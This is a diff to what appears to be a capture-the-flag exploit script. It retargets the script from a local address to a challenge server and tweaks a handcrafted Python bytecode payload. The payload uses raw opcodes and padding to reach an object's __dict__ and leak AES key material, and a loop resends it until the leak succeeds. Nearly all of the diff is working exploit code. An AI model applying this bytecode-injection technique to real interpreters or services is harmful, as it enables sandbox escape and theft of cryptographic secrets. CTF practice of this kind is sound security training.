@@ -16,8 +16,8 @@ def op(op, arg=None):
     )
 
 
-host = "0.0.0.0"
-port = 1337
+host = "challenges.cybermouflons.com"
+port = 10184
 
 idx_2_obj = {}
 for i in range(0, 300):
@@ -56,8 +56,6 @@ assert aes_idx is not None
 assert get_attr_idx is not None
 assert dict_idx is not None
 
-print("[+] First stage done!")
-
 exploit = b"".join(
     [
         op("RESUME", 0),
@@ -65,6 +63,7 @@ exploit = b"".join(
         op("LOAD_FAST", context_idx),  # Context
         op("LOAD_FAST", dict_idx),  # __dict__
         op("CALL", 1),
+        b"\x00" * 8,
         op("LOAD_FAST", aes_idx),  # 'aes'
         op("BINARY_SUBSCR"),  # AES obj
         b"\x00" * 8,
@@ -72,6 +71,7 @@ exploit = b"".join(
         op("COPY", 2),
         op("LOAD_FAST", dict_idx),  # __dict__
         op("CALL", 1),
+        b"\x00" * 8,
         op("LOAD_FAST", get_attr_idx),
         op("LOAD_FAST", context_idx),  # Context
         op("LOAD_FAST", dict_idx),  # __dict__
@@ -80,7 +80,11 @@ exploit = b"".join(
         op("BINARY_OP", 7),  # merge dicts
         op("RETURN_VALUE"),  # return
     ]
-).hex()
+)
+
+assert len(exploit) <= 66
+
+exploit = exploit.hex()
 
 ## Now that we have the indices for loading we should try multiple times to send the exploit as the success is probabilistic
 
@@ -91,6 +95,8 @@ while b"ct" not in response and b"key_matrices" not in response:
     io.sendline(bytes(exploit, encoding="utf-8"))
     try:
         response = io.recvline().rstrip()
+        if b"ct" not in response and b"key_matrices" not in response:
+            print("[+] Invalid response: ", response)
     except Exception as e:
         print("[+] Exploit failed trying again...")
 print("[+] Success!")
